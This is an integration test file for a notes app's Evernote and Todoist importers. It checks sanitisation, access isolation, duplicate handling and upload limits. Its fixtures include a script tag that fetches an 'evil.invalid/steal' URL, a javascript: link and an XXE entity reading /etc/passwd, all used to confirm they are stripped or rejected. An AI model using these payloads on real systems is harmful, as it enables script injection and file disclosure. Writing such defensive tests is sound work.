// SPDX-License-Identifier: AGPL-3.0-only
// Integration tests on PostgreSQL 17 for 1-step Evernote (.enex) and Todoist (.csv) importers (#3564, V2-9):
// real HTTP multipart uploads + Runtime.execute persistence, private visibility, tainted=true, preserved timestamps,
// BlobStore attachment storage + rollback on DB error + duplicate skip cleanup, Todoist priority inversion 4->P1..1->P4,
// fail-closed XXE/DTD blocking, cross-member/cross-org isolation, viewer/agent/extension-token 403, and module-off 404.
import { createHash, randomBytes, randomUUID } from 'node:crypto';
import { fileURLToPath } from 'node:url';
import { SignJWT } from 'jose';
import pg from 'pg';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { createDb, createPool } from '@ludy/db';
import { migrate, setRolePasswords } from '@ludy/db/migrate';
import { kernelCommands, kernelQueries } from '@ludy/kernel';
import type { EnexImportResult, Note, NoteSummary, NotebookSummary, Todo, TodoListSummary, TodoistImportResult } from '@ludy/kernel-contract';
import { BlobNotFoundError, DomainError, Runtime, sha256Hex, type BlobStore, type CredentialBroker } from '@ludy/kernel-runtime';
import { notesCommands, notesQueries } from '@ludy/mod-notes';
import { createAuthenticator } from '../src/auth.ts';
import { loadConfig } from '../src/config.ts';
import { createHttpApp } from '../src/http.ts';
import { RateLimiter } from '../src/rate-limit.ts';
import { createSessionStatusSource } from '../src/sessions.ts';
import { fakeMediaMeasurer } from './fake-media.ts';
import { TEST_MANIFESTS } from './manifests.ts';

const ADMIN = process.env.LUDY_TEST_ADMIN_URL ?? process.env.CROVE_TEST_ADMIN_URL;
const MIGRATIONS = fileURLToPath(new URL('../../../supabase/migrations', import.meta.url));
const SECRET = 'test-only-notes-importers-secret-0123456789-abcdef';
const ISSUER = 'crove-auth-notes-importers';
const EXT_ID = 'b'.repeat(32);
const suite = ADMIN ? describe : describe.skip;

class MemoryStore implements BlobStore {
  readonly storage = new Map<string, Uint8Array>();
  async put(key: string, bytes: Uint8Array): Promise<string> {
    this.storage.set(key, new Uint8Array(bytes));
    return `content:${sha256Hex(bytes)}`;
  }
  async get(key: string): Promise<Uint8Array> {
    const bytes = this.storage.get(key);
    if (!bytes) throw new BlobNotFoundError(key);
    return bytes;
  }
  async getRange(key: string, start: number, end: number): Promise<Uint8Array> {
    return (await this.get(key)).subarray(start, end + 1);
  }
  async delete(key: string): Promise<void> {
    this.storage.delete(key);
  }
}

const tinyPng = () =>
  new Uint8Array([
    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
    0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
    0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
    0x08, 0x06, 0x00, 0x00, 0x00, 0x1f, 0x15, 0xc4,
    0x89, 0x00, 0x00, 0x00, 0x0a, 0x49, 0x44, 0x41,
    0x54, 0x78, 0x9c, 0x63, 0x00, 0x01, 0x00, 0x00,
    0x05, 0x00, 0x01, 0x0d, 0x0a, 0x2d, 0xb4, 0x00,
    0x00, 0x00, 0x00, 0x49, 0x45, 0x4e, 0x44, 0xae,
    0x42, 0x60, 0x82,
  ]);

const tinyPdf = () => new TextEncoder().encode('%PDF-1.4\n1 0 obj\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF\n');

const challengeOf = (verifier: string) => createHash('sha256').update(verifier).digest('base64url');

suite('Notes v2 E5a (#3564): Evernote (.enex) and Todoist (.csv) importers on PostgreSQL 17', () => {
  const dbName = `ludy_test_notes_import_${Date.now()}_${Math.floor(Math.random() * 1e6)}`;
  let adminUrl = '';
  let pool: pg.Pool;
  let runtime: Runtime;
  let app: ReturnType<typeof createHttpApp>;
  const store = new MemoryStore();
  const accounts = new Map<string, { subject: string; email: string; session: string }>();
  let slug = '';
  let orgId = '';

  async function admin<T>(fn: (client: pg.Client) => Promise<T>): Promise<T> {
    const client = new pg.Client({ connectionString: adminUrl });
    await client.connect();
    try {
      return await fn(client);
    } finally {
      await client.end();
    }
  }

  async function jwt(name: string, mfa = false) {
    let who = accounts.get(name);
    if (!who) {
      who = { subject: randomUUID(), email: `${name}-${randomUUID().slice(0, 8)}@notes-import.test`, session: randomUUID() };
      accounts.set(name, who);
    }
    const now = Math.floor(Date.now() / 1000);
    const assurance = mfa ? { aal: 'aal2', amr: [{ method: 'totp', timestamp: now }] } : { aal: 'aal1' };
    return new SignJWT({ role: 'authenticated', email: who.email, session_id: who.session, is_anonymous: false, ...assurance })
      .setProtectedHeader({ alg: 'HS256' })
      .setSubject(who.subject)
      .setIssuer(ISSUER)
      .setAudience('authenticated')
      .setIssuedAt()
      .setExpirationTime('15m')
      .sign(new TextEncoder().encode(SECRET));
  }

  const asJsonHeaders = async (name: string, targetSlug: string | null = slug, mfa = false) => ({
    authorization: `Bearer ${await jwt(name, mfa)}`,
    'content-type': 'application/json',
    ...(targetSlug ? { 'x-ludy-org': targetSlug } : {}),
  });

  const asAuthHeaders = async (name: string, targetSlug: string | null = slug) => ({
    authorization: `Bearer ${await jwt(name, false)}`,
    ...(targetSlug ? { 'x-ludy-org': targetSlug } : {}),
  });

  async function rpc(path: string, headers: Record<string, string>, input: unknown) {
    const response = await app.request(`/api/rpc/${path}`, {
      method: 'POST',
      headers,
      body: JSON.stringify(input === undefined ? {} : { json: input }),
    });
    const body = (await response.json()) as { json?: Record<string, unknown> };
    return { status: response.status, body: (body.json ?? body) as Record<string, unknown> };
  }

  async function join(name: string, targetSlug: string, ownerName: string, role: 'admin' | 'member' | 'viewer') {
    await jwt(name);
    const email = accounts.get(name)?.email;
    const invited = await rpc('org/invite', await asJsonHeaders(ownerName, targetSlug, true), { email, role });
    expect(invited.status).toBe(200);
    const accepted = await rpc('invites/accept', await asJsonHeaders(name, null), { token: String(invited.body.acceptPath).split('#')[1] });
    expect(accepted.status).toBe(200);
  }

  async function uploadEnex(
    name: string,
    xml: string | Uint8Array,
    fields: Record<string, string> = {},
    targetSlug = slug,
  ) {
    const form = new FormData();
    const bytes = typeof xml === 'string' ? new TextEncoder().encode(xml) : xml;
    form.append('file', new Blob([new Uint8Array(bytes)], { type: 'application/xml' }), fields['filename'] ?? 'backup.enex');
    for (const [k, v] of Object.entries(fields)) {
      if (k !== 'filename') form.append(k, v);
    }
    const response = await app.request('/api/notes/import/enex', {
      method: 'POST',
      headers: await asAuthHeaders(name, targetSlug),
      body: form,
    });
    return { status: response.status, body: (await response.json()) as Record<string, unknown> };
  }

  async function uploadTodoist(
    name: string,
    csv: string | Uint8Array,
    fields: Record<string, string> = {},
    targetSlug = slug,
  ) {
    const form = new FormData();
    const bytes = typeof csv === 'string' ? new TextEncoder().encode(csv) : csv;
    form.append('file', new Blob([new Uint8Array(bytes)], { type: 'text/csv' }), fields['filename'] ?? 'Work List [42].csv');
    for (const [k, v] of Object.entries(fields)) {
      if (k !== 'filename') form.append(k, v);
    }
    const response = await app.request('/api/notes/import/todoist', {
      method: 'POST',
      headers: await asAuthHeaders(name, targetSlug),
      body: form,
    });
    return { status: response.status, body: (await response.json()) as Record<string, unknown> };
  }

  beforeAll(async () => {
    const root = new pg.Client({ connectionString: ADMIN });
    await root.connect();
    await root.query(`CREATE DATABASE ${dbName}`);
    await root.end();
    const base = new URL(ADMIN as string);
    base.pathname = `/${dbName}`;
    adminUrl = base.toString();
    await migrate({ adminUrl, dir: MIGRATIONS });
    await setRolePasswords(adminUrl, { ludy_app: 'test-app-pw', ludy_worker: 'test-worker-pw' });
    const appUrl = new URL(adminUrl);
    appUrl.username = 'ludy_app';
    appUrl.password = 'test-app-pw';
    pool = createPool({ connectionString: appUrl.toString(), max: 8 });
    const db = createDb(pool);
    const config = loadConfig({
      DATABASE_URL: appUrl.toString(),
      AUTH_JWT_SECRET: SECRET,
      AUTH_ISSUER: ISSUER,
      AUTH_SESSION_CHECK: 'off',
      MIGRATIONS_DIR: MIGRATIONS,
      WEB_DIST: '/nonexistent',
      EXTENSION_IDS: EXT_ID,
    });
    runtime = new Runtime(db, { manifests: TEST_MANIFESTS, sessions: createSessionStatusSource('off'), stepUp: 'required' }).register({
      commands: [...kernelCommands, ...notesCommands],
      queries: [...kernelQueries({ inboundDomain: null }), ...notesQueries],
    });
    const broker = {
      keyId: 'k1-notes-import',
      keyIds: ['k1-notes-import'],
      derive: (purpose: string) => createHash('sha256').update(`test-secret:${purpose}`).digest(),
      deriveKey: (keyId: string, purpose: string) => createHash('sha256').update(`test-secret:${keyId}:${purpose}`).digest(),
    } as unknown as CredentialBroker;
    app = createHttpApp({
      config,
      runtime,
      store,
      broker,
      authenticate: createAuthenticator(config, db),
      pool,
      aiEnabled: false,
      extensionTokenLimit: new RateLimiter({ perMinute: 40 }),
      mediaMeasurer: fakeMediaMeasurer(),
    });
    const created = await rpc('org/create', await asJsonHeaders('owner', null), {
      name: `Notes Import Org ${randomUUID().slice(0, 6)}`,
      idempotencyKey: randomUUID(),
    });
    expect(created.status).toBe(200);
    slug = String(created.body.slug);
    orgId = String(created.body.orgId);
    await join('member', slug, 'owner', 'member');
    await join('other', slug, 'owner', 'member');
    await join('viewer', slug, 'owner', 'viewer');
  }, 300_000);

  afterAll(async () => {
    await pool?.end();
    const root = new pg.Client({ connectionString: ADMIN });
    await root.connect();
    await root.query(`DROP DATABASE IF EXISTS ${dbName} WITH (FORCE)`);
    await root.end();
  }, 60_000);

  it('persists private tainted Evernote notes, timestamps, tags, notebooks, and attachments, enforces skipDuplicates + BlobStore cleanup, and isolates members', async () => {
    const pngB64 = Buffer.from(tinyPng()).toString('base64');
    const pdfB64 = Buffer.from(tinyPdf()).toString('base64');
    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<en-export>
  <notebook>Engineering Specs</notebook>
  <note>
    <title>Architecture Decision</title>
    <content><![CDATA[<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE en-note SYSTEM "http://xml.evernote.com/pub/enml2.dtd">
<en-note>
  <p>Confirmed via Evernote export.</p>
  <img src="https://tracking.invalid/pixel.png" />
  <script>fetch('https://evil.invalid/steal')</script>
  <a href="javascript:alert(1)">Bad link</a>
</en-note>]]></content>
    <created>20240210T071500Z</created>
    <updated>20240211T082000Z</updated>
    <tag>Arch</tag>
    <tag>ADR</tag>
    <resource>
      <data encoding="base64">${pngB64}</data>
      <mime>image/png</mime>
      <resource-attributes><file-name>diagram.png</file-name></resource-attributes>
    </resource>
    <resource>
      <data encoding="base64">${pdfB64}</data>
      <mime>image/png</mime>
      <resource-attributes><file-name>contract.pdf</file-name></resource-attributes>
    </resource>
  </note>
</en-export>`;

    const res = await uploadEnex('member', xml);
    expect(res.status, JSON.stringify(res.body)).toBe(201);
    const body = res.body as unknown as EnexImportResult;
    expect(body).toMatchObject({
      importedNotes: 1,
      createdNotebooks: 1,
      reusedNotebooks: 0,
      attachmentsCount: 2,
      skippedDuplicates: 0,
      strippedRemoteImages: 1,
      unusedStorageKeys: [],
    });
    expect(body.noteIds).toHaveLength(1);
    const noteId = body.noteIds[0]!;

    const noteRes = await rpc('notes/get', await asJsonHeaders('member'), { noteId });
    expect(noteRes.status).toBe(200);
    const note = noteRes.body as unknown as Note;
    expect(note.visibility).toBe('private');
    expect(note.tainted).toBe(true);
    expect(note.tags).toEqual(['arch', 'adr']);
    expect(note.body).toContain('Confirmed via Evernote export.');
    expect(note.body).not.toContain('evil.invalid');
    expect(note.body).not.toContain('javascript:');
    expect(note.body).not.toContain('tracking.invalid');
    expect(new Date(note.createdAt).toISOString()).toBe('2024-02-10T07:15:00.000Z');
    expect(new Date(note.updatedAt).toISOString()).toBe('2024-02-11T08:20:00.000Z');
    expect(note.attachments).toHaveLength(2);
    // Magic-byte classification ignores spoofed image/png on contract.pdf.
    const pdfAtt = note.attachments?.find((a) => a.filename === 'contract.pdf');
    expect(pdfAtt?.contentType).toBe('application/pdf');
    expect(pdfAtt?.extractStatus).toBe('pending');
    expect(store.storage.size).toBe(2);

    const outbox = await admin(async (c) =>
      (await c.query<{ payload: { attachmentId: string } }>(
        `SELECT payload FROM ludy_kernel.outbox_event WHERE org_id = $1 AND type = 'notes.attachment.extract_queued'`,
        [orgId],
      )).rows,
    );
    expect(outbox.map((r) => r.payload.attachmentId)).toEqual([pdfAtt?.id]);

    // Author downloads imported attachment; other org member and owner get 404.
    const authDl = await app.request(`/api/notes/attachments/${pdfAtt!.id}`, { headers: await asAuthHeaders('member') });
    expect(authDl.status).toBe(200);
    for (const outsider of ['other', 'owner', 'viewer']) {
      const deniedDl = await app.request(`/api/notes/attachments/${pdfAtt!.id}`, { headers: await asAuthHeaders(outsider) });
      expect(deniedDl.status, outsider).toBe(404);
      const deniedGet = await rpc('notes/get', await asJsonHeaders(outsider), { noteId });
      expect(deniedGet.status, outsider).toBe(404);
    }

    const otherList = await rpc('notes/list', await asJsonHeaders('other'), { view: 'mine' });
    expect((otherList.body as unknown as NoteSummary[]) ?? []).toEqual([]);
    const otherNotebooks = await rpc('notes/notebooks/list', await asJsonHeaders('other'), {});
    expect(((otherNotebooks.body as { notebooks?: NotebookSummary[] }).notebooks) ?? []).toEqual([]);

    // Audit trail logs counts only, zero note titles or attachment filenames.
    const auditRows = await admin(async (c) =>
      (await c.query<{ detail: unknown }>(
        `SELECT detail FROM ludy_kernel.audit_event WHERE org_id = $1 AND command = 'notes.note.import_enex'`,
        [orgId],
      )).rows,
    );
    expect(auditRows).toHaveLength(1);
    expect(JSON.stringify(auditRows[0]?.detail)).not.toContain('Architecture Decision');
    expect(JSON.stringify(auditRows[0]?.detail)).not.toContain('contract.pdf');

    // Re-import with skipDuplicates=true skips note and removes unused blobs cleanly from store.
    const dupRes = await uploadEnex('member', xml, { skipDuplicates: 'true' });
    expect(dupRes.status).toBe(201);
    expect(dupRes.body).toMatchObject({
      importedNotes: 0,
      skippedDuplicates: 1,
      attachmentsCount: 0,
      unusedStorageKeys: [],
    });
    expect(store.storage.size).toBe(2);

    // Intra-batch duplicates + distinct notes targeting the same brand-new notebook create 1 notebook, count 0 reused, keep non-duplicates, and delete skipped duplicate blobs.
    const intraBatchEnex = `<?xml version="1.0" encoding="UTF-8"?>
<en-export>
  <notebook>Fresh Batch Book</notebook>
  <note>
    <title>Repeated Title</title>
    <content><![CDATA[<en-note><p>First</p></en-note>]]></content>
    <resource><data encoding="base64">${pngB64}</data><mime>image/png</mime><resource-attributes><file-name>one.png</file-name></resource-attributes></resource>
  </note>
  <note>
    <title>Repeated Title</title>
    <content><![CDATA[<en-note><p>Duplicate inside same batch</p></en-note>]]></content>
    <resource><data encoding="base64">${pdfB64}</data><mime>application/pdf</mime><resource-attributes><file-name>dup.pdf</file-name></resource-attributes></resource>
  </note>
  <note>
    <title>Unique Second</title>
    <content><![CDATA[<en-note><p>Second note in same brand-new notebook</p></en-note>]]></content>
  </note>
</en-export>`;
    const batchRes = await uploadEnex('member', intraBatchEnex, { skipDuplicates: 'true' });
    expect(batchRes.status, JSON.stringify(batchRes.body)).toBe(201);
    expect(batchRes.body).toMatchObject({
      importedNotes: 2,
      createdNotebooks: 1,
      reusedNotebooks: 0,
      attachmentsCount: 1,
      skippedDuplicates: 1,
      unusedStorageKeys: [],
    });
    expect((batchRes.body as unknown as EnexImportResult).notebookIds).toHaveLength(1);
    // Only the first note's blob remains added (+1 -> total 3).
    expect(store.storage.size).toBe(3);
  });

  it('fails closed on XXE/DTD XML and invalid UTF-8, and rolls back BlobStore blobs on DB command failure', async () => {
    const blobsBefore = store.storage.size;
    const xxe = `<?xml version="1.0"?>
<!DOCTYPE en-export [
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<en-export><note><title>&secret;</title><content><![CDATA[<en-note>bad</en-note>]]></content></note></en-export>`;
    const xxeRes = await uploadEnex('member', xxe);
    expect(xxeRes.status).toBe(400);
    expect(xxeRes.body.code).toBe('NOTE_IMPORT_UNSAFE_XML');
    expect(store.storage.size).toBe(blobsBefore);

    const badUtf8 = new Uint8Array([0xff, 0xfe, 0x00, 0x3c]);
    const badRes = await uploadEnex('member', badUtf8);
    expect(badRes.status).toBe(400);
    expect(badRes.body.code).toBe('NOTE_IMPORT_INVALID');
    expect(store.storage.size).toBe(blobsBefore);

    // Foreign private notebook target triggers NOTEBOOK_NOT_FOUND inside DB transaction -> staged blob is rolled back!
    const ownerNb = await rpc('notes/notebooks/create', await asJsonHeaders('owner'), { name: 'Owner Only', visibility: 'private' });
    expect(ownerNb.status).toBe(200);
    const pngB64 = Buffer.from(tinyPng()).toString('base64');
    const validWithResource = `<en-export><note><title>Rollback Test</title><content><![CDATA[<en-note>ok</en-note>]]></content><resource><data encoding="base64">${pngB64}</data><mime>image/png</mime></resource></note></en-export>`;
    const failTarget = await uploadEnex('member', validWithResource, { targetNotebookId: String(ownerNb.body.notebookId) });
    expect(failTarget.status).toBe(404);
    expect(failTarget.body.code).toBe('NOTEBOOK_NOT_FOUND');
    expect(store.storage.size).toBe(blobsBefore);
  });

  it('persists Todoist CSV into private lists, sections, inverted priorities (4->P1..1->P4), checklist steps, due dates, tags, and isolates members', async () => {
    const csv =
      '\uFEFFTYPE,CONTENT,DESCRIPTION,PRIORITY,INDENT,DATE,TIMEZONE,LABELS\r\n' +
      'section,Launch Prep,,1,1,,,\r\n' +
      'task,"Sign vendor contract @legal","Line A\nLine B, detail",4,1,2026-06-15T10:30,Asia/Ho_Chi_Minh,"Procurement, Q2"\r\n' +
      'task,Check stamp,,1,2,,,\r\n' +
      'note,Remember archive copy,,1,1,,,\r\n' +
      'task,Review deck,,3,1,,,\r\n' +
      'task,Update wiki,,2,1,,,\r\n' +
      'task,Clean inbox,,1,1,,,\r\n';

    const res = await uploadTodoist('member', csv);
    expect(res.status, JSON.stringify(res.body)).toBe(201);
    const body = res.body as unknown as TodoistImportResult;
    expect(body).toMatchObject({
      importedTodos: 4,
      createdLists: 1,
      updatedLists: 0,
      createdSections: 1,
      checklistSteps: 1,
      skippedDuplicates: 0,
    });

    const listsRes = await rpc('notes/todos/lists/list', await asJsonHeaders('member'), {});
    expect(listsRes.status).toBe(200);
    const lists = (listsRes.body as { lists: TodoListSummary[] }).lists;
    const createdList = lists.find((l) => l.name === 'Work List');
    expect(createdList).toBeDefined();
    expect(createdList?.sections.map((s) => s.name)).toEqual(['Launch Prep']);

    const firstTodoRes = await rpc('notes/todos/get', await asJsonHeaders('member'), { todoId: body.todoIds[0] });
    expect(firstTodoRes.status).toBe(200);
    const firstTodo = firstTodoRes.body as unknown as Todo & { tainted?: boolean };
    expect(firstTodo.title).toBe('Sign vendor contract');
    expect(firstTodo.priority).toBe(1); // CSV 4 -> P1
    expect(firstTodo.details).toContain('Line A\nLine B, detail');
    expect(firstTodo.details).toContain('Remember archive copy');
    expect(firstTodo.checklist).toEqual([{ text: 'Check stamp', done: false }]);
    expect(firstTodo.tags).toEqual(['legal', 'procurement', 'q2']);
    expect(firstTodo.dueOn).toBe('2026-06-15');
    expect(firstTodo.dueTime).toBe('10:30');
    expect(firstTodo.sectionId).toBe(createdList?.sections[0]?.id);

    const dbTodos = await admin(async (c) =>
      (await c.query<{ title: string; priority: number; tainted: boolean }>(
        `SELECT title, priority, tainted FROM ludy_notes.todo WHERE org_id = $1 AND id = ANY($2::uuid[]) ORDER BY priority ASC`,
        [orgId, body.todoIds],
      )).rows,
    );
    expect(dbTodos).toEqual([
      { title: 'Sign vendor contract', priority: 1, tainted: true },
      { title: 'Review deck', priority: 2, tainted: true },
      { title: 'Update wiki', priority: 3, tainted: true },
      { title: 'Clean inbox', priority: 4, tainted: true },
    ]);

    // Duplicate skip on re-import of same CSV into same list.
    const dup = await uploadTodoist('member', csv, { skipDuplicates: 'true' });
    expect(dup.status).toBe(201);
    expect(dup.body).toMatchObject({ importedTodos: 0, skippedDuplicates: 4 });

    // Other member sees zero imported lists or todos.
    const otherLists = await rpc('notes/todos/lists/list', await asJsonHeaders('other'), {});
    expect((otherLists.body as { lists: TodoListSummary[] }).lists).toEqual([]);
    const otherTodoGet = await rpc('notes/todos/get', await asJsonHeaders('other'), { todoId: body.todoIds[0] });
    expect(otherTodoGet.status).toBe(404);
  });

  it('refuses viewer role (403), extension tokens (403), agents, cross-org targets, and module-disabled orgs (404)', async () => {
    const simpleEnex = `<en-export><note><title>Test</title><content><![CDATA[<en-note>hi</en-note>]]></content></note></en-export>`;
    const simpleCsv = 'TYPE,CONTENT,PRIORITY\ntask,Item,4\n';

    expect((await uploadEnex('viewer', simpleEnex)).status).toBe(403);
    expect((await uploadTodoist('viewer', simpleCsv)).status).toBe(403);

    // Mint extension token with 'notes' scope: still refused (403) on import routes (human-only).
    const verifier = randomBytes(32).toString('base64url');
    const authRes = await app.request('/api/extension/authorize', {
      method: 'POST',
      headers: await asJsonHeaders('member'),
      body: JSON.stringify({ extensionId: EXT_ID, codeChallenge: challengeOf(verifier), codeChallengeMethod: 'S256', scopes: ['notes'], deviceName: 'Ext' }),
    });
    const authCode = ((await authRes.json()) as { code: string }).code;
    const tokenRes = await app.request('/api/extension/token', {
      method: 'POST',
      headers: { 'content-type': 'application/json', origin: `chrome-extension://${EXT_ID}` },
      body: JSON.stringify({ code: authCode, codeVerifier: verifier }),
    });
    const extToken = ((await tokenRes.json()) as { token: string }).token;

    const extEnexForm = new FormData();
    extEnexForm.append('file', new Blob([simpleEnex], { type: 'application/xml' }), 'a.enex');
    const extEnex = await app.request('/api/notes/import/enex', {
      method: 'POST',
      headers: { authorization: `Bearer ${extToken}`, 'x-ludy-org': slug },
      body: extEnexForm,
    });
    expect(extEnex.status).toBe(403);

    const extCsvForm = new FormData();
    extCsvForm.append('file', new Blob([simpleCsv], { type: 'text/csv' }), 'a.csv');
    const extCsv = await app.request('/api/notes/import/todoist', {
      method: 'POST',
      headers: { authorization: `Bearer ${extToken}`, 'x-ludy-org': slug },
      body: extCsvForm,
    });
    expect(extCsv.status).toBe(403);

    // Agents are strictly blocked on import commands.
    await expect(
      runtime.execute('notes.todo.import_todoist', { csv: simpleCsv }, { actor: { type: 'agent', agentId: randomUUID(), runId: randomUUID() }, orgId }),
    ).rejects.toBeInstanceOf(DomainError);

    // Org with Notes app disabled returns 404.
    const ownerHeaders = await asJsonHeaders('owner', slug, true);
    const offRes = await rpc('org/setApp', ownerHeaders, { module: 'notes', enabled: false });
    expect(offRes.status).toBe(200);
    try {
      expect((await uploadEnex('member', simpleEnex)).status).toBe(404);
      expect((await uploadTodoist('member', simpleCsv)).status).toBe(404);
    } finally {
      await rpc('org/setApp', ownerHeaders, { module: 'notes', enabled: true });
    }
  });

  it('returns targetNotebookId in notebookIds and reusedNotebooks when importing into an explicit notebook', async () => {
    const nbRes = await rpc('notes/notebooks/create', await asJsonHeaders('member'), { name: 'Target Book', visibility: 'private' });
    expect(nbRes.status).toBe(200);
    const targetNotebookId = String(nbRes.body.notebookId);

    const xml = `<?xml version="1.0" encoding="UTF-8"?>
<en-export>
  <notebook>Ignored Book</notebook>
  <note>
    <title>Pinned To Target</title>
    <content><![CDATA[<en-note><p>One</p></en-note>]]></content>
  </note>
  <note>
    <title>Second In Target</title>
    <content><![CDATA[<en-note><p>Two</p></en-note>]]></content>
  </note>
</en-export>`;

    const res = await uploadEnex('member', xml, { targetNotebookId });
    expect(res.status, JSON.stringify(res.body)).toBe(201);
    expect(res.body).toMatchObject({
      importedNotes: 2,
      createdNotebooks: 0,
      reusedNotebooks: 1,
      skippedDuplicates: 0,
      notebookIds: [targetNotebookId],
    });

    const listInNb = await rpc('notes/list', await asJsonHeaders('member'), { view: 'mine', notebookId: targetNotebookId });
    expect(listInNb.status).toBe(200);
    expect((listInNb.body as unknown as NoteSummary[]).map((n) => n.title).sort()).toEqual(['Pinned To Target', 'Second In Target']);

    // Re-importing the exact notes into the target notebook with skipDuplicates=true skips them cleanly.
    const dupRes = await uploadEnex('member', xml, { targetNotebookId, skipDuplicates: 'true' });
    expect(dupRes.status).toBe(201);
    expect(dupRes.body).toMatchObject({
      importedNotes: 0,
      reusedNotebooks: 0,
      skippedDuplicates: 2,
      notebookIds: [],
    });
  });

  it('batches multi-hundred ENEX and Todoist inserts cleanly with rebalance, taint, RLS, and bounded stream caps', async () => {
    const nbRes = await rpc('notes/notebooks/create', await asJsonHeaders('member'), { name: 'Bulk ENEX Book', visibility: 'private' });
    expect(nbRes.status).toBe(200);
    const bulkNotebookId = String(nbRes.body.notebookId);

    const pngB64 = Buffer.from(tinyPng()).toString('base64');
    const enexNotesXml = Array.from({ length: 210 }, (_, idx) => {
      const resourceXml =
        idx === 0 || idx === 205
          ? `<resource><data encoding="base64">${pngB64}</data><mime>image/png</mime><resource-attributes><file-name>img-${idx}.png</file-name></resource-attributes></resource>`
          : '';
      return `<note><title>Bulk Note ${idx}</title><content><![CDATA[<en-note><p>Body ${idx}</p></en-note>]]></content>${resourceXml}</note>`;
    }).join('');
    const bulkEnex = `<?xml version="1.0" encoding="UTF-8"?><en-export>${enexNotesXml}</en-export>`;

    const enexRes = await uploadEnex('member', bulkEnex, { targetNotebookId: bulkNotebookId });
    expect(enexRes.status, JSON.stringify(enexRes.body)).toBe(201);
    const enexBody = enexRes.body as unknown as EnexImportResult;
    expect(enexBody).toMatchObject({
      importedNotes: 210,
      createdNotebooks: 0,
      reusedNotebooks: 1,
      attachmentsCount: 2,
      notebookIds: [bulkNotebookId],
    });
    expect(enexBody.noteIds).toHaveLength(210);

    const enexDbRows = await admin(async (c) =>
      (await c.query<{ n: string }>(
        `SELECT count(*)::text AS n FROM ludy_notes.note WHERE org_id = $1 AND notebook_id = $2 AND tainted = true AND visibility = 'private'`,
        [orgId, bulkNotebookId],
      )).rows,
    );
    expect(enexDbRows[0]?.n).toBe('210');

    // 260 Todoist tasks cross INSERT_BATCH_SIZE (200) and trigger REBALANCE_AT (> 48 chars) sort_key spreading.
    const todoistRows = Array.from({ length: 260 }, (_, idx) => `task,Bulk Todo ${String(idx).padStart(3, '0')},,${(idx % 4) + 1},1,,,`).join('\n');
    const bulkCsv = `TYPE,CONTENT,DESCRIPTION,PRIORITY,INDENT,DATE,TIMEZONE,LABELS\n${todoistRows}\n`;

    const todoRes = await uploadTodoist('member', bulkCsv, { filename: 'Bulk Sprint [99].csv' });
    expect(todoRes.status, JSON.stringify(todoRes.body)).toBe(201);
    const todoBody = todoRes.body as unknown as TodoistImportResult;
    expect(todoBody).toMatchObject({
      importedTodos: 260,
      createdLists: 1,
      skippedDuplicates: 0,
    });
    expect(todoBody.todoIds).toHaveLength(260);

    const sortedRows = await admin(async (c) =>
      (await c.query<{ id: string; sort_key: string; tainted: boolean }>(
        `SELECT id, sort_key, tainted FROM ludy_notes.todo WHERE org_id = $1 AND id = ANY($2::uuid[]) ORDER BY sort_key ASC`,
        [orgId, todoBody.todoIds],
      )).rows,
    );
    expect(sortedRows).toHaveLength(260);
    expect(sortedRows.every((r) => r.tainted)).toBe(true);
    expect(sortedRows.map((r) => r.id)).toEqual(todoBody.todoIds);
    expect(sortedRows.every((r) => r.sort_key.length <= 48)).toBe(true);

    // Other member still cannot read any of the bulk-inserted rows.
    const otherTodoRes = await rpc('notes/todos/get', await asJsonHeaders('other'), { todoId: todoBody.todoIds[259] });
    expect(otherTodoRes.status).toBe(404);

    // Chunked multipart stream without Content-Length exceeding Todoist cap returns 413 TOO_LARGE.
    const boundary = '----LudyChunkedBoundary12345';
    const preamble = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="huge.csv"\r\nContent-Type: text/csv\r\n\r\nTYPE,CONTENT\n`;
    const epilogue = `\r\n--${boundary}--\r\n`;
    const fillerChunk = new Uint8Array(512 * 1024).fill(0x41);
    const oversizedStream = new ReadableStream<Uint8Array>({
      start(controller) {
        controller.enqueue(new TextEncoder().encode(preamble));
        for (let i = 0; i < 12; i += 1) controller.enqueue(fillerChunk);
        controller.enqueue(new TextEncoder().encode(epilogue));
        controller.close();
      },
    });
    const authHdrs = await asAuthHeaders('member');
    const streamRes = await app.request('/api/notes/import/todoist', {
      method: 'POST',
      headers: {
        ...authHdrs,
        'content-type': `multipart/form-data; boundary=${boundary}`,
      },
      body: oversizedStream,
      // @ts-expect-error duplex is required by Node fetch for streaming Request bodies
      duplex: 'half',
    });
    expect(streamRes.status).toBe(413);
    expect(((await streamRes.json()) as { code?: string }).code).toBe('TOO_LARGE');

    // Non-multipart raw upload with invalid UTF-8 fails closed with 400 NOTE_IMPORT_INVALID.
    const rawBadUtf8 = await app.request('/api/notes/import/todoist?filename=raw.csv', {
      method: 'POST',
      headers: { ...authHdrs, 'content-type': 'text/csv' },
      body: new Uint8Array([0xff, 0xfe, 0x00, 0x3c]),
    });
    expect(rawBadUtf8.status).toBe(400);
    expect(((await rawBadUtf8.json()) as { code?: string }).code).toBe('NOTE_IMPORT_INVALID');
  });

  it('serializes concurrent Todoist import, list creation, and todo creation without sort_key collisions or deadlocks (#5035)', async () => {
    const ownerHeaders = await asJsonHeaders('owner');
    const authHdrs = await asAuthHeaders('owner');
    const seedRes = await rpc('notes/todos/create', ownerHeaders, { title: 'Seed Rebalance Tail' });
    expect(seedRes.status, JSON.stringify(seedRes.body)).toBe(200);
    const seedTodoId = String(seedRes.body.todoId);
    const tightKey = 'z'.repeat(48);
    await admin((c) =>
      c.query(`UPDATE ludy_notes.todo SET sort_key = $1 WHERE org_id = $2 AND id = $3`, [tightKey, orgId, seedTodoId]),
    );

    const concurrentRows = Array.from({ length: 260 }, (_, idx) => `task,Concurrent Task ${String(idx).padStart(3, '0')},,${(idx % 4) + 1},1,,,`).join('\n');
    const concurrentCsv = `TYPE,CONTENT,DESCRIPTION,PRIORITY,INDENT,DATE,TIMEZONE,LABELS\n${concurrentRows}\n`;

    const importReq = async () => {
      const form = new FormData();
      form.append('file', new Blob([new TextEncoder().encode(concurrentCsv)], { type: 'text/csv' }), 'Concurrent Import.csv');
